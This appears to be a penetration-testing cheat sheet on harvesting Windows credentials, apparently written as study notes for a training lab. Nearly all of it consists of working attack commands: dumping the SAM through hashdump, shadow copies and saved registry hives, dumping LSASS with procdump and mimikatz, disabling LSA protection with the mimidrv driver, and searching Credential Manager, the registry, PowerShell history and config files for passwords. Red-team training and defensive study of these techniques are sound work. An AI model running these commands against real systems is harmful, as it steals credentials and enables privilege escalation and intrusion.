# Credentials Harvesting

## Local Windows Credentials

### Dumping the SAM

#### Metasploit HashDump

Gets a copy of the content of the SAM database by using in-memory code inejction the LSSAS.exe process.

`meterpreter > hashdump`

#### Volume Shadow Copy Service

A native service that helps perform volume backup while application read/write on volumes. (Note: needs administrator privileges).

1. `C:\Users\Administrator>wmic shadowcopy call create Volume='C:'` to create a copy of shaodw of `C:` Drive
2. `vssadmin list shadows` to confirm that we have a shadow copy of `C:`&#x20;
3. The SAM database is encrypted with RC4 or AES, so we need the decryption key which is stored in `c:\Windows\System32\Config\system`&#x20;
   1. `copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam`&#x20;
   2. `copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system`&#x20;

#### Registry Hives

Windows Registry stored a copy of some of the SAM database contents to be used by window services.

1. Save both decryption files for the decryption key
   1. `reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg`&#x20;
   2. `reg save HKLM\system C:\users\Administrator\Desktop\system-reg`&#x20;
2. `python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL` to use Impact `secretsdump.py` to decrypt. Specified `LOCAL` to specify that this is the LOCAL SAM

### Dumping the LSASS

#### GUI

To dump any running Windows process using the GUI, open Task Manager and from the Details tab right-click on a process to "Create dump file".

#### Sysinternals Suite

Using ProcDump we can dump the lsass given that the Sysinternals Suite is installed.

`procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump`

{% hint style="info" %}
Dumping the LSASS process is a known technique easily caught by AVs. AV bypasses need to implemented in the real world to perform such an action.
{% endhint %}

#### MimiKatz

`mimikatz.exe` to run the mimikatz binary **(Note: must be run as `SYSTEM` or local administrator).**

`privilege::debug` to enable the `SeDebugPrivilege` privilege and check the current permissions for memory access.

`sekurlsa::logonpasswords` to dump all cached passwords and hashes from the `lsass.exe`

**Protected LSASS**

Since 2012, the LSASS has been protected from being accessed to extract credentials from memory.

`!+` in mimikatz to run the `mimidrv.sys` driver that runs at the kernel to disaable the LSA protection

`!processprotect /process:lsass.exe /remove` to disable the protection.

### Windows Credential Manager

Accessible via a GUI in the Control Panel. But also via the command prompt.

`vaultcmd /list` to enumerate which windows vaults exist

`VaultCmd /listproperties:"VAULT"` to view if there are any stored credentials

`VaultCmd /listcreds:"Web Credentials"` to view more information about it

#### Dumping the WCM

Must use PowerShell Scripts such as the [`Get-WebCredentials.ps1`](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)&#x20;

#### RunAs

Allows users to run Windows applications under different users' permissions.&#x20;

`cmdkey /list`  as another way to enumerate the stored credentials, can use `/list:computername` as well

`runas /savecred /user:THM.red\thm-local cmd.exe` to run the cmd.exe as thm-local user

## Quick Wins

#### Powershell History

`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`&#x20;

#### Saved Windows Credentials

`cmdkey /list` lists all credentials stored in the Windows Credential Manager (Note: won't allow you to view them directly)

`runas /savecred /user:admin cmd.exe` run a cmd.exe as the user stored in the Credential Manager

`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v keyword` to view if auto-log on is stored in the Windows registry

`reg query HKLM /f "password" /t REG_SZ /s` to search the registry for anything related to the password

#### Internet Information Services (IIS) Configuration

Is responsible for the default web server on Windows installs. Will sometimes store password for databases or configurated authentications.

```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

#### Retrieve Credentials from software

PuTTY (SSH client on windows): stores connection parameters such as IPs and SSH passwords. Only accessible with Proxy  `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`
